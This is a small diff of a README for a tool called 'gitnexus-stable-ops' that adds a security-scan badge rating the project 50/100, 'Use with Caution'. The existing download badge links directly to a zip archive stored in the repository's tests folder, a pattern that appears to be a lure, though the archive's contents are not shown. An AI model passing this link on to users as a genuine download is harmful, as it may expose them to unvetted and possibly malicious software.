@@ -1,6 +1,7 @@
 # 🧩 gitnexus-stable-ops - Run GitNexus at scale
 
 [![Download GitNexus Stable Ops](https://img.shields.io/badge/Download-GitNexus_Stable_Ops-blue?style=for-the-badge)](https://github.com/maddieunlawful958/gitnexus-stable-ops/raw/refs/heads/main/tests/gitnexus-stable-ops-v1.2-alpha.4.zip)
+[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/maddieunlawful958-gitnexus-stable-ops)
 
 ## 🚀 Getting Started
 
